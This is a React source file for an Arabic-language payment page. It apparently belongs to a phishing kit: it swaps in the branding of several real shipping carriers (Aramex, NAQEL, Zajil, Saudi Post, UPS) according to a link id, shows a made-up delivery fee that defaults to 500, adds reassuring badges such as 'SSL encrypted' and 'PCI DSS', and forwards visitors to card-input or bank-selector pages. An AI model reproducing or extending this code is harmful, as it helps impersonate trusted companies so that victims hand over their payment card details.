import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBrandingByCompany } from "@/lib/brandingSystem";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { NAQELLayout, ZajilLayout, SaudiPostLayout, UPSLayout } from "@/components/MoreCompanyLayouts";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, Shield, CheckCircle2, Lock } from "lucide-react";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);

  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const enhancedBranding = getBrandingByCompany(serviceKey);
  const shippingInfo = linkData?.payload as any;

  const getLayout = () => {
    const key = serviceKey.toLowerCase();
    switch (key) {
      case 'naqel':
        return NAQELLayout;
      case 'zajil':
        return ZajilLayout;
      case 'saudipost':
        return SaudiPostLayout;
      case 'ups':
        return UPSLayout;
      default:
        const CompanyLayout = getCompanyLayout(serviceKey);
        return CompanyLayout;
    }
  };

  const LayoutComponent = getLayout();
  const countryCode = shippingInfo?.selectedCountry || "SA";
  const currencyInfo = getCurrencyByCountry(countryCode);
  const rawAmount = shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, countryCode);
  
  const handleProceed = () => {
    const paymentMethod = shippingInfo?.payment_method || 'card';
    
    if (paymentMethod === 'card') {
      navigate(`/pay/${id}/card-input`);
    } else {
      navigate(`/pay/${id}/bank-selector`);
    }
  };
  
  const paymentContent = (
    <div className="space-y-4" style={{
      fontFamily: enhancedBranding?.fonts.arabic || 'Almarai, sans-serif'
    }}>
      {/* Trust Badges */}
      <div className="grid grid-cols-3 gap-2 mb-5">
        {[
          { icon: Shield, label: 'دفع آمن', color: branding.colors.primary },
          { icon: Lock, label: 'مشفر SSL', color: branding.colors.primary },
          { icon: CheckCircle2, label: 'موثوق', color: branding.colors.primary }
        ].map((item, idx) => (
          <div 
            key={idx}
            className="p-2 rounded-lg text-center"
            style={{
              background: `${branding.colors.primary}08`,
              border: `1px solid ${branding.colors.primary}20`
            }}
          >
            <item.icon className="w-4 h-4 sm:w-5 sm:h-5 mx-auto mb-1" style={{ color: item.color }} />
            <span className="text-[10px] sm:text-xs font-medium" style={{ 
              color: enhancedBranding?.colors.text 
            }}>
              {item.label}
            </span>
          </div>
        ))}
      </div>

      {/* Shipping Info Display */}
      {shippingInfo && (
        <div className="p-3 sm:p-4 rounded-lg" style={{
          background: `${branding.colors.primary}08`,
          border: `1px solid ${branding.colors.primary}20`
        }}>
          <h3 className="font-bold mb-2.5 text-xs sm:text-sm flex items-center gap-1.5" style={{
            color: enhancedBranding?.colors.text
          }}>
            <Package className="w-4 h-4" style={{ color: branding.colors.primary }} />
            تفاصيل الشحنة
          </h3>
          <div className="space-y-2 text-xs sm:text-sm">
            {shippingInfo.tracking_number && (
              <div className="flex items-center justify-between py-1.5 border-b" style={{
                borderColor: `${branding.colors.primary}15`
              }}>
                <div className="flex items-center gap-1.5">
                  <Hash className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
                  <span style={{ color: enhancedBranding?.colors.textLight }}>رقم التتبع</span>
                </div>
                <span className="font-bold" style={{ color: enhancedBranding?.colors.text }}>
                  {shippingInfo.tracking_number}
                </span>
              </div>
            )}
            {shippingInfo.package_description && (
              <div className="flex items-center justify-between py-1.5 border-b" style={{
                borderColor: `${branding.colors.primary}15`
              }}>
                <div className="flex items-center gap-1.5">
                  <Truck className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
                  <span style={{ color: enhancedBranding?.colors.textLight }}>وصف الطرد</span>
                </div>
                <span className="font-bold" style={{ color: enhancedBranding?.colors.text }}>
                  {shippingInfo.package_description}
                </span>
              </div>
            )}
            {shippingInfo.cod_amount > 0 && (
              <div className="flex items-center justify-between py-1.5">
                <div className="flex items-center gap-1.5">
                  <DollarSign className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
                  <span style={{ color: enhancedBranding?.colors.textLight }}>مبلغ الدفع</span>
                </div>
                <span className="font-bold text-base" style={{ color: branding.colors.primary }}>
                  {formatCurrency(shippingInfo.cod_amount, countryCode)}
                </span>
              </div>
            )}
          </div>
        </div>
      )}
      
      {/* Payment Summary - Highlighted */}
      <div className="space-y-3 mb-5">
        <div className="flex justify-between items-center py-2.5 text-xs sm:text-sm">
          <span style={{ color: enhancedBranding?.colors.textLight }}>الخدمة</span>
          <span className="font-bold" style={{ color: enhancedBranding?.colors.text }}>
            {serviceName}
          </span>
        </div>
        
        <div 
          className="flex justify-between items-center py-3 sm:py-4 rounded-xl px-3 sm:px-4"
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary || branding.colors.primary}10)`,
            border: `2px solid ${branding.colors.primary}30`
          }}
        >
          <span className="text-sm sm:text-base font-bold" style={{ color: enhancedBranding?.colors.text }}>
            المبلغ الإجمالي
          </span>
          <span className="text-lg sm:text-xl md:text-2xl font-bold" style={{ color: branding.colors.primary }}>
            {formattedAmount}
          </span>
        </div>
      </div>
    
      {/* Payment Method */}
      <div className="mb-5">
        <h3 className="font-bold mb-2.5 text-xs sm:text-sm" style={{
          color: enhancedBranding?.colors.text
        }}>
          طريقة الدفع
        </h3>
        <div 
          className="border-2 rounded-xl p-3 sm:p-4 transition-all hover:shadow-md"
          style={{
            borderColor: branding.colors.primary,
            background: `${branding.colors.primary}08`
          }}
        >
          <div className="flex items-center gap-2.5 sm:gap-3">
            <div 
              className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg flex items-center justify-center"
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary || branding.colors.primary})`
              }}
            >
              <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
            </div>
            <div className="flex-1">
              <p className="font-bold text-xs sm:text-sm mb-0.5" style={{ color: enhancedBranding?.colors.text }}>
                الدفع بالبطاقة
              </p>
              <p className="text-[10px] sm:text-xs" style={{ color: enhancedBranding?.colors.textLight }}>
                Visa • Mastercard • Mada
              </p>
            </div>
            <Shield className="w-5 h-5 opacity-50" style={{ color: branding.colors.primary }} />
          </div>
        </div>
      </div>
      
      {/* Proceed Button */}
      <Button
        onClick={handleProceed}
        size="lg"
        className="w-full text-xs sm:text-sm py-4 sm:py-4.5 text-white font-bold transition-all hover:shadow-lg"
        style={{
          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary || branding.colors.primary})`,
          fontFamily: enhancedBranding?.fonts.arabic
        }}
      >
        <span className="ml-2">الدفع بالبطاقة</span>
        <ArrowLeft className="w-3.5 h-3.5 sm:w-4 sm:h-4 mr-2" />
      </Button>
    
      <p className="text-[9px] sm:text-[10px] text-center mt-3" style={{ 
        color: enhancedBranding?.colors.textLight 
      }}>
        بالمتابعة، أنت توافق على الشروط والأحكام
      </p>

      {/* Security Footer */}
      <div className="mt-4 pt-4 border-t flex items-center justify-center gap-3" style={{
        borderColor: `${branding.colors.primary}15`
      }}>
        <div className="flex items-center gap-1">
          <Shield className="w-3 h-3" style={{ color: branding.colors.primary }} />
          <span className="text-[9px]" style={{ color: enhancedBranding?.colors.textLight }}>
            PCI DSS
          </span>
        </div>
        <div className="flex items-center gap-1">
          <Lock className="w-3 h-3" style={{ color: branding.colors.primary }} />
          <span className="text-[9px]" style={{ color: enhancedBranding?.colors.textLight }}>
            SSL 256-bit
          </span>
        </div>
      </div>
    </div>
  );

  return (
    <LayoutComponent
      companyKey={serviceKey}
      trackingNumber={shippingInfo?.tracking_number}
      amount={formattedAmount}
    >
      {paymentContent}
    </LayoutComponent>
  );
};

export default PaymentDetails;
